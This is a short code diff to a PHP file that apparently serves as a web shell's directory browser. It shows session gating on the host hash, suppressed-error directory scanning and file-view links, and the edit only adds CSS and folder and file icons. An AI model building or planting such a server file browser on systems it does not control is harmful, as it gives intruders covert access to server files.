@@ -94,6 +94,9 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
 	} td.header {
 		font-weight:bold;
 		padding:7px;
+	} .icon {
+		width:25px;
+		height:25px;
 	}
 </style>
 <?php
@@ -618,7 +621,8 @@ foreach (@scandir(@cwd()) as $dir) {
 		</center>';
 	}
 	?>
-	<tr class="hover"><td> [ D ]. 
+	<tr class="hover"><td>
+	<img class="icon" src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png">
 	<a href='?dir=<?php print @cwd().SEP.$dir ?>'><?php print $dir ?></a></td>
 	<td>
 		<center>
@@ -637,8 +641,8 @@ foreach (@scandir(@cwd()) as $dir) {
 }
 foreach (@scandir(@cwd()) as $file) {
 	if (!is_file($file)) continue;
-	?><tr class="hover">
-	<td>[ F ].
+	?><tr class="hover"><td>
+	<img class="icon" src="https://cdn.pixabay.com/photo/2014/04/03/00/40/document-309065_960_720.png">
 	<a href='?action=view&dir=<?php print @cwd()."&file=".@cwd().SEP.$file ?>'><?php print $file ?></a>
 	</td>
 	<td>
